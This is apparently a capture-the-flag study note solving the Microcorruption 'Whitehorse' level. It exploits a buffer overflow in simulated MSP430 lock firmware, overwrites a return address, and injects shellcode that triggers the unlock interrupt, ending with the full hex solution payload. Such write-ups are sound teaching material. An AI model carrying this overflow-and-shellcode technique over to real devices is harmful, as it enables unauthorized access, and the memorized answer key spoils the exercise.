---
id: study-microcorruption-whitehorse
aliases: []
tags:
  - microcorruption
  - whitehorse
---

# Microcorruption

[Microcorruption](https://www.microcorruption.com) CTF is a capture the flag (CTF) competition designed to teach
low-level reverse engineering by pitting the user against a lock mechanism
running on a simulated MSP430 controller. The user exploits MSP430 assembly to gain
access to the device and unlock the door.

## Microcorruption (Whitehorse)

- This is Software Revision 01. The firmware has been updated to
  connect with the new hardware security module. We have removed the
  function to unlock the door from the LockIT Pro firmware.

## Long Passwords

Password prompts you to enter between 8 and 16 characters, but you are able to
overflow the buffer from 0x3864-0x3894.

Let's use an input that's easy for indexing byte locations:
`0102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F`

This causes an `insn address unaligned` error, so we'll want to find where a
returned value is getting overwritten to an unexpected address.

## `<main>`

```assembly
call #0x44f4  <login>
```

## `<login>`

```assembly
call  #0x4446 <conditional_unlock_door>
tst   r15
jz    $+0x8 <login+0x2e>                              ; Jump to failure message
mov   #0x44c5 "Access granted.", r15
jnz   $+0x6 <login+0x32>                              ; Jump to success message
mov   #0x44d5 "That password is not correct.", r15
call  #0x4596 <puts>
add   #0x10, sp
ret                                                   ; Return to SP (0x3874)
```

After success or failure, this returns to `<main>` and stops execution.

Handling of the unlock must be in `<conditional_unlock_door>`.

The return here is where the operation goes to an invalid address, and stepping
over the return here shows the program counter goes to address `0x1211` after
this function. This shows us that bytes 17 and 18 are overwriting its return
address.

## `<conditional_unlock_door>`

```assembly
push  r4              ;
mov   sp, r4          ; Store the stack pointer in R4
incd  r4              ; Increment to the next double
decd  sp              ; Decrease the stack by double
mov.b #0x0, -0x4(r4)  ; Clear the byte at R4-0x4
mov   #0xfffc, r14
add   r4, r14         ; R14 = R4 - 0x3 (0xFFFF - 0xFFFC)
push  r14             ; Decrement SP by 2 and store R14 at new address (0x385E)
push  r15             ; Decrement SP by 2 and store R15 at new address (0x3864)
push  #0x7e           ; Set flag for checking if password is correct
call  #0x4532 <INT>   ; Call interrupt to check password
mov.b -0x4(r4), r15
sxt   r15
add   #0x8, sp        ; SP + 0x8 = 0x3860
pop   r4              ; Stores value at SP in R4 and increments SP + 2
ret                   ; Returns to value stored at SP (0x3864)
```

The `<INT>` function is obfuscated from the user, and handles the password
checking and unlock.

Nothing jumps out here, but the return address of `<login>` can be used
to return something else...

## Stack Overflow Attack

This is the first time in these exercises where we've needed to inject our
own code to manipulate the lock. Referring to [the Microcorruption manual](https://microcorruption.com/public/manual.pdf)
shows that there are a few arguments similar to the `0x7E` used by
`<conditional_unlock_door>` for operation of the lock:

> INT 0x7F - Interface with deadbolt to trigger an unlock (Takes no arguments)

So if we can inject something like this at `0x3864` it should trigger an unlock:

```assembly
push  #0x7f
call  #0x4532 ; <INT>
```

## Assembling Shellcode

We can use the [Microcorruption (Dis)Assembler](https://microcorruption.com/assembler) to generate hex machine code from this code:
`30127f00b0123245`

_Note_: If trying to generate [Machine Code](https://en.wikipedia.org/wiki/Machine_code) in the wild, you'll need to match the
target tool change, assemble an object file from your code and dump it to
hex using `objcopy`.

## Inserting Shellcode

Combining what we know from examining the password locations, our password
buffer starts at address `0x3864`, and following the `<login>` function call,
we can force it jump to any address by writing those bytes to the
17-18th bytes in our password.

By creating a password that consists of shellcode, filler and the address
of the shellcode at bytes 17 and 18, we can execute the shellcode.

## Solution

`30127f00b0123245090A0B0C0D0E0F106438`
